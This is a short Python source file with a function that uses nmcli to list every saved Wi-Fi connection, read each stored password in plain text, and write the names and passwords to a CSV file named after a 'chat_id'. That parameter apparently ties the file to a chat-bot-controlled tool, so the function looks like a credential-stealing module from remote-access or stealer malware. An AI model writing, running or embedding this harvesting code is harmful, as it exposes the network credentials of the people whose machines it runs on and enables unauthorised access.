import subprocess
import csv

def get_wifi_passwords(chat_id: str):
    wifi_data = []
    result = subprocess.run(["nmcli", "-t", "-f", "NAME", "connection", "show"], capture_output=True, text=True)
    ssids = result.stdout.strip().split("\n")
    for ssid in ssids:
        if not ssid:  
            continue
        cmd = ["nmcli", "-s", "-g", "802-11-wireless-security.psk", "connection", "show", ssid]
        password_result = subprocess.run(cmd, capture_output=True, text=True)

        password = password_result.stdout.strip()
        if not password:
            password = "N/A"  
        wifi_data.append([ssid, password])
    
    with open(f'{chat_id}.csv', 'w') as file:
        write = csv.writer(file)
        write.writerow(['Wi-Fi name', "Password"])
        write.writerows(wifi_data)
        
    return wifi_data

